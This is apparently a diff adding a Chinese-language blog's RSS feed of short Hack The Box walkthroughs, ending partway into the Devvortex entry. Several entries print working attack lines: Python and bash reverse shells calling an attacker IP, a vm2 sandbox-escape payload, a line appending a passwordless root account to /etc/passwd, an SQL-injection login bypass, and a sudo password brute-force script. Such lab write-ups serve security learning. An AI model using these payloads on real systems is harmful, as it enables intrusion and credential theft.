+        <guid>https://example.com/htb/broker%E6%9C%AA%E5%AE%8C/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;简单爆破admin:adminin&lt;/p&gt;
+&lt;p&gt;进入后台发现服务器版本ActiveMQ 5.15.15&lt;/p&gt;
+&lt;p&gt;搜索poc&lt;/p&gt;
+&lt;h4 id=&#34;font-stylecolorrgb60-72-88cve-2023-4660font&#34;&gt;&lt;font style=&#34;color:rgb(60, 72, 88);&#34;&gt;CVE-2023-4660&lt;/font&gt;
+&lt;/h4&gt;&lt;p&gt;根据用法使用拿到shell&lt;/p&gt;
+&lt;h1 id=&#34;提权&#34;&gt;提权
+&lt;/h1&gt;&lt;p&gt;尝试通过增加sshkey链接但无法实现&lt;/p&gt;
+&lt;p&gt;未完待续&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Busqueda</title>
+        <link>https://example.com/htb/busqueda/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/busqueda/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;扫描端口正常的几个端口，网站打开下来发现版本是search 2.4.0&lt;/p&gt;
+&lt;p&gt;网上搜索poc直接反弹shell&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39;, exec(&amp;#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#39;10.10.16.21&amp;#39;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#39;/bin/sh&amp;#39;,&amp;#39;-i&amp;#39;]);&amp;#34;))#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;h1 id=&#34;scv-root&#34;&gt;scv-root
+&lt;/h1&gt;&lt;p&gt;在进入的目录/var/www/tmp中有.git文件夹，里面含有用户连接git的配置，拿到密码&lt;/p&gt;
+&lt;p&gt;换ssh连接，后sudo -l查看root文件&lt;/p&gt;
+&lt;p&gt;/usr/bin/python3 /opt/scripts/system-checkup.py *&lt;/p&gt;
+&lt;p&gt;运行后有三个选项，分析后发现这个system-checkup.py以当前目录的三个sh文件运行&lt;/p&gt;
+&lt;p&gt;我们可以创建一个同名选项的sh文件&lt;/p&gt;
+&lt;p&gt;eg1:!#/bin/bash（将sh文件化为命令执行台）&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(17, 17, 17);&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.20.151/7777 0&amp;gt;&amp;amp;1(反弹shell)&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(17, 17, 17);&#34;&gt;or&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(92, 38, 153);background-color:rgb(249, 249, 249);&#34;&gt;echo &lt;/font&gt;&lt;font style=&#34;color:rgb(196, 26, 22);background-color:rgb(249, 249, 249);&#34;&gt;&amp;lsquo;hacker::0:0:System Administrator:/root/root:/bin/bash&amp;rsquo;&lt;/font&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt; &amp;raquo; /etc/passwd（创建一个root权限用户）&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt;&lt;/font&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Codify</title>
+        <link>https://example.com/htb/codify/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/codify/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;扫描端口正常，有域名爆子域名无发现，目录扫描无发现&lt;/p&gt;
+&lt;p&gt;打开网页发现能够执行js代码&lt;/p&gt;
+&lt;p&gt;找一段反弹shell代码执行进入&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sync function fn() {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    (function stack() {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        new Error().stack;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        stack();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    })();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;p = fn();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;p.constructor = {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    [Symbol.species]: class FakePromise {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        constructor(executor) {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            executor(
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                (x) =&amp;gt; x,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                (err) =&amp;gt; { return err.constructor.constructor(&amp;#39;return process&amp;#39;)().mainModule.require(&amp;#39;child_process&amp;#39;).execSync(&amp;#34;bash -c &amp;#39;bash -i &amp;gt; /dev/tcp/10.10.16.21/2333 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&amp;#39;&amp;#34;); }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            )
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;p.then();
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;进入/home查看用户，还有另一个用户joshua无权限&lt;/p&gt;
+&lt;p&gt;在/var/www/contact中有一个db文件&lt;/p&gt;
+&lt;p&gt;cat能看到joshua的hash密码爆破spongebob1&lt;/p&gt;
+&lt;p&gt;ssh登录成功&lt;/p&gt;
+&lt;p&gt;sudo -l查看root文件&lt;/p&gt;
+&lt;p&gt;有一个sudo /opt/scripts/mysql-backup.sh&lt;/p&gt;
+&lt;p&gt;该文件有存在不严格匹配的问题&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/codify/1726814013707-bf5de8f2-349a-45bb-a40b-a2a420a84bf3.png&#34;
+	width=&#34;973&#34;
+	height=&#34;345&#34;
+	srcset=&#34;https://example.com/htb/codify/1726814013707-bf5de8f2-349a-45bb-a40b-a2a420a84bf3_hua602b0ec3e08bb3abd771e67e81001d6_53350_480x0_resize_box_3.png 480w, https://example.com/htb/codify/1726814013707-bf5de8f2-349a-45bb-a40b-a2a420a84bf3_hua602b0ec3e08bb3abd771e67e81001d6_53350_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;282&#34;
+		data-flex-basis=&#34;676px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;用大佬的poc拿到root&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import string
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;import subprocess
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;all = list(string.ascii_letters + string.digits)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;password = &amp;#34;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;found = False
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;while not found:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    for character in all:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        command = f&amp;#34;echo &amp;#39;{password}{character}*&amp;#39; | sudo /opt/scripts/mysql-backup.sh&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        if &amp;#34;Password confirmed!&amp;#34; in output:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            password += character
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            print(password)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            break
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    else:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        found = True
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description>
+        </item>
+        <item>
+        <title>CozyHosting</title>
+        <link>https://example.com/htb/cozyhosting/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/cozyhosting/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;nmap扫描，目录爆破，存在域名加上子域名扫描&lt;/p&gt;
+&lt;p&gt;端口，子域名无发现&lt;/p&gt;
+&lt;p&gt;目录爆破找到一个接口/actuator&lt;/p&gt;
+&lt;p&gt;在/actuator/sessions下发现一个用户的cookie&lt;/p&gt;
+&lt;p&gt;更改本地cookie去登录admin界面（注意cookie会变）&lt;/p&gt;
+&lt;p&gt;后再cms后台存在命令注入&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/cozyhosting/1726646271232-22ead988-d590-4ec4-b978-4bfa030ef1e3.png&#34;
+	width=&#34;1259&#34;
+	height=&#34;554&#34;
+	srcset=&#34;https://example.com/htb/cozyhosting/1726646271232-22ead988-d590-4ec4-b978-4bfa030ef1e3_hud79489e71fbeebd6fc3b888e7608c365_81313_480x0_resize_box_3.png 480w, https://example.com/htb/cozyhosting/1726646271232-22ead988-d590-4ec4-b978-4bfa030ef1e3_hud79489e71fbeebd6fc3b888e7608c365_81313_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;227&#34;
+		data-flex-basis=&#34;545px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;不能空格所以￥{IFS}代替&lt;/p&gt;
+&lt;p&gt;拿到shell&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;在/app目录下有个jar包，反编译能在里面找到一个数据库的账号密码和库&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/cozyhosting/1726646376187-e221a6ff-8198-4b9c-8e57-5e0fa568f4a7.png&#34;
+	width=&#34;1435&#34;
+	height=&#34;947&#34;
+	srcset=&#34;https://example.com/htb/cozyhosting/1726646376187-e221a6ff-8198-4b9c-8e57-5e0fa568f4a7_hu3b49df79bf42061afc58070881d4ae20_114455_480x0_resize_box_3.png 480w, https://example.com/htb/cozyhosting/1726646376187-e221a6ff-8198-4b9c-8e57-5e0fa568f4a7_hu3b49df79bf42061afc58070881d4ae20_114455_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;151&#34;
+		data-flex-basis=&#34;363px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;登录拿到admin用户的哈希密码，john爆破&lt;/p&gt;
+&lt;p&gt;猜测为josh用户的密码&lt;/p&gt;
+&lt;p&gt;ssh登录成功&lt;/p&gt;
+&lt;p&gt;sudo -l查看能root执行ssh功能&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/cozyhosting/1726646455085-270591c2-32c3-41ca-89d6-8a4109c56f21.png&#34;
+	width=&#34;1012&#34;
+	height=&#34;256&#34;
+	srcset=&#34;https://example.com/htb/cozyhosting/1726646455085-270591c2-32c3-41ca-89d6-8a4109c56f21_hu1e399a7061069b4c15da99bcd4af86ae_13451_480x0_resize_box_3.png 480w, https://example.com/htb/cozyhosting/1726646455085-270591c2-32c3-41ca-89d6-8a4109c56f21_hu1e399a7061069b4c15da99bcd4af86ae_13451_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;395&#34;
+		data-flex-basis=&#34;948px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;拿到shell&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Cronos</title>
+        <link>https://example.com/htb/cronos/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/cronos/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;端口，域名，目录三件套&lt;/p&gt;
+&lt;p&gt;网站进去是appech的配置默认页面，没有发现啥&lt;/p&gt;
+&lt;p&gt;这次没有给域名，根据htb的经验是cronos.htb&lt;/p&gt;
+&lt;p&gt;（看wp说是用nslookup能探测到）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/cronos/1729064934641-6c3ab1fe-092f-40ad-8418-d1d409e576e6.png&#34;
+	width=&#34;937&#34;
+	height=&#34;893&#34;
+	srcset=&#34;https://example.com/htb/cronos/1729064934641-6c3ab1fe-092f-40ad-8418-d1d409e576e6_huf4fcb63e0996815b8859cea3455694f7_438265_480x0_resize_box_3.png 480w, https://example.com/htb/cronos/1729064934641-6c3ab1fe-092f-40ad-8418-d1d409e576e6_huf4fcb63e0996815b8859cea3455694f7_438265_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;104&#34;
+		data-flex-basis=&#34;251px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;扫子域名，有俩个www和admin&lt;/p&gt;
+&lt;p&gt;www没发现，admin是个登录的&lt;/p&gt;
+&lt;p&gt;在用户名有注入点&lt;/p&gt;
+&lt;p&gt;具体为admin&amp;rsquo; &amp;ndash; -&lt;img src=&#34;https://example.com/htb/cronos/1729065009635-985a1d93-1bd2-4bed-8582-4c4d7485141b.png&#34;
+	width=&#34;848&#34;
+	height=&#34;694&#34;
+	srcset=&#34;https://example.com/htb/cronos/1729065009635-985a1d93-1bd2-4bed-8582-4c4d7485141b_hu56f1197e7f2e9e12a2384654e848b1a9_152048_480x0_resize_box_3.png 480w, https://example.com/htb/cronos/1729065009635-985a1d93-1bd2-4bed-8582-4c4d7485141b_hu56f1197e7f2e9e12a2384654e848b1a9_152048_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;122&#34;
+		data-flex-basis=&#34;293px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;进入一个页面里面能够ping ip&lt;/p&gt;
+&lt;p&gt;经典的命令注入拿到shell&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;进入页面有个数据库的配置文件，拿到一个admin用户和密码，不过没啥用，user.txt也可以拿到&lt;/p&gt;
+&lt;p&gt;linpeas.sh扫到一个root权限有运行文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/cronos/1729065217601-c6e1c252-e9e4-4061-8a5f-83e68b016a7b.png&#34;
+	width=&#34;792&#34;
+	height=&#34;405&#34;
+	srcset=&#34;https://example.com/htb/cronos/1729065217601-c6e1c252-e9e4-4061-8a5f-83e68b016a7b_hub80f891f52290a6959e50bdc0e9d7f43_49932_480x0_resize_box_3.png 480w, https://example.com/htb/cronos/1729065217601-c6e1c252-e9e4-4061-8a5f-83e68b016a7b_hub80f891f52290a6959e50bdc0e9d7f43_49932_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;195&#34;
+		data-flex-basis=&#34;469px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;我们还有更改这个文件的权限&lt;/p&gt;
+&lt;p&gt;直接将shell文件重命名拿到root&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Curling</title>
+        <link>https://example.com/htb/curling/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/curling/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;端口，域名，目录&lt;/p&gt;
+&lt;p&gt;网页源代码最下面有个提示sercet.txt&lt;/p&gt;
+&lt;p&gt;打开是个base64解码 “Curling2018!”&lt;/p&gt;
+&lt;p&gt;根据网页有个叫 Floris  的人，登录&lt;/p&gt;
+&lt;p&gt;进入后台在模板管理界面能写php&lt;/p&gt;
+&lt;p&gt;进入系统&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;在floris的用户目录下有个文件名提升是密码备份&lt;/p&gt;
+&lt;p&gt;层层解压拿到密码&lt;/p&gt;
+&lt;p&gt;ssh登录&lt;/p&gt;
+&lt;p&gt;之后wp说有个系统进程能看到&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/curling/1729400281109-1671ba26-6752-45eb-9e8f-c035fc7e2c71.png&#34;
+	width=&#34;916&#34;
+	height=&#34;53&#34;
+	srcset=&#34;https://example.com/htb/curling/1729400281109-1671ba26-6752-45eb-9e8f-c035fc7e2c71_hua9a6df88a22a76c4b5c8353bf8dac0ff_49163_480x0_resize_box_3.png 480w, https://example.com/htb/curling/1729400281109-1671ba26-6752-45eb-9e8f-c035fc7e2c71_hua9a6df88a22a76c4b5c8353bf8dac0ff_49163_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1728&#34;
+		data-flex-basis=&#34;4147px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这样的&lt;/p&gt;
+&lt;p&gt;但是我的没有不知道为什么&lt;/p&gt;
+&lt;p&gt;提权思路&lt;/p&gt;
+&lt;p&gt;把input的url网址用文件协议改为自己的/etc/shadow这样看密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;url = &amp;#34;file:///etc/shadow&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;也可以在创建一个没有密码的id_rsa.pub文件放进&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;/root/.ssh/authorized_keys&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;中，就可以登录root&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Devvortex</title>
+        <link>https://example.com/htb/devvortex/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/devvortex/</guid>
+        <description>&lt;p&gt;寻找立足点&lt;/p&gt;
+&lt;p&gt;拿到ip扫端口&lt;/p&gt;
+&lt;p&gt;开了俩22，80&lt;/p&gt;
+&lt;p&gt;浏览器打开未发现信息，使用gobuster扫描子域名，有dev，加入hosts文件打开&lt;/p&gt;
+&lt;p&gt;扫描这个增加网站之后的，扫到了cms，joomla&lt;/p&gt;
+&lt;p&gt;据查joomscan能扫cms信息（但是我无法扫到任何信息）&lt;/p&gt;
+&lt;p&gt;看wp得知/administrator/manifests/files/joomla.xml目录下有网站版本信息&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/devvortex/1724075127414-f4e25b3d-697b-4e59-a18b-6f1f0420e2c7.png&#34;
+	width=&#34;886&#34;
+	height=&#34;559&#34;
+	srcset=&#34;https://example.com/htb/devvortex/1724075127414-f4e25b3d-697b-4e59-a18b-6f1f0420e2c7_hu6f4c9ab7970a94718088aabe9c5fddea_275527_480x0_resize_box_3.png 480w, https://example.com/htb/devvortex/1724075127414-f4e25b3d-697b-4e59-a18b-6f1f0420e2c7_hu6f4c9ab7970a94718088aabe9c5fddea_275527_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;158&#34;
+		data-flex-basis=&#34;380px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;搜索joomla4.2.6版本信息得知**&lt;font style=&#34;color:rgba(0, 0, 0, 0.85);&#34;&gt;Joomla未授权访问漏洞(CVE-2023-23752)&lt;/font&gt;**&lt;/p&gt;
